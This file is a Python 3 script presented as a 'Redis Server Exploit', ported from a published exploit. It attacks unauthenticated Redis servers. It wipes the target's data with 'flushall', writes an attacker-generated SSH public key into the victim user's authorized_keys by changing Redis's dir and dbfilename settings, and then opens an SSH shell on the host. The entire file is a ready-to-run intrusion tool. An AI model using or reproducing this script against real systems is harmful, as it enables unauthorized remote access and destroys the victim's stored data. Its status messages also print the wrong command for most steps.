#! /usr/bin/python3
#Author : Avinash Kumar Thapa aka -Acid
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

#modifed for python3 by: beauchompers 
#based on this https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt

import os
import os.path
import argparse
from sys import argv
from termcolor import colored, cprint

# args
arg_parser = argparse.ArgumentParser(description='Redis Server Exploit')
arg_parser.add_argument('--ip', dest='ip_address', help='Ip address of the redis server', type=str, required=True)
arg_parser.add_argument('--user', dest='username', help='username, default redis', type=str, default='redis')
arg_parser.add_argument('--keyname', dest='key', type=str, help="keyname to generate", default='redis')
arg_parser.add_argument('--path', dest='path', help='Path to drop the key, can get this with --getdirs', type=str, default='/var/lib/')
arg_parser.add_argument('--getdirs', dest='getdirs', help='Prints out the results of the config get dir command on the redis server', action='store_true', default=False)

args = arg_parser.parse_args()

PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def get_dirs():
	if os.path.isfile(PATH) or os.path.isfile(PATH1):
		try:
			cprint('*******************************************************************', 'green')
			cprint('* [+] [Get Dirs] Getting Dirs from REDIS Server*' ,"green")
			cprint('*******************************************************************', "green")
			cmd = "redis-cli -h " + args.ip_address + ' config get dir'
			print(cmd)
			os.system(cmd)
		except:
			cprint("Something went wrong", "red")
	else:
		cprint("Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.", "red")


def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/'+ args.key + ' ' + args.username+"@"+args.ip_address
	os.system(shell)


def exploit_redis():
	if os.path.isfile(PATH) or os.path.isfile(PATH1):
		try:
			cprint('*******************************************************************', "green")
			cprint('* [+] [Exploit] Exploiting misconfigured REDIS SERVER*' ,"green")
			cprint('*******************************************************************', "green")
			print('\n')
			cprint("SSH Keys Need to be Generated", 'blue')
			os.system(f'ssh-keygen -t rsa -C \"mango\" -f $HOME/.ssh/{args.key}')
			cprint("Keys Generated Successfully", "blue")
			cprint("Creating exploit key...")
			os.system(f"(echo '\r\n\'; cat $HOME/.ssh/{args.key}.pub; echo  \'\r\n\') > $HOME/.ssh/redis_exploit_key.txt")
			cmd = f"redis-cli -h {args.ip_address}"
			cmd1 = cmd + ' flushall'
			os.system(cmd1)
			cmd2 = f"cat $HOME/.ssh/redis_exploit_key.txt | redis-cli -h {args.ip_address} -x set cracklist"
			os.system(cmd2)
			cmd3 = cmd + ' config get dir'
			cmd4 = cmd + f' config set dir {args.path}{args.username}/.ssh/'
			cmd5 = cmd + ' config set dbfilename "authorized_keys"'
			cmd6 = cmd + ' save'
			cprint(f'Command: {cmd3}', 'green')
			os.system(cmd3)
			cprint(f'Command: {cmd3}', 'green')
			os.system(cmd4)
			cprint(f'Command: {cmd3}', 'green')
			os.system(cmd5)
			cprint(f'Command: {cmd3}', 'green')
			os.system(cmd6)
			cprint("You'll get shell in sometime..Thanks for your patience", "green")
			ssh_connection()

		except:
			cprint("Something went wrong", "red")
	else:
		cprint("Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.", "red")

# execution
if not args.getdirs:
    exploit_redis()
else:
    get_dirs()





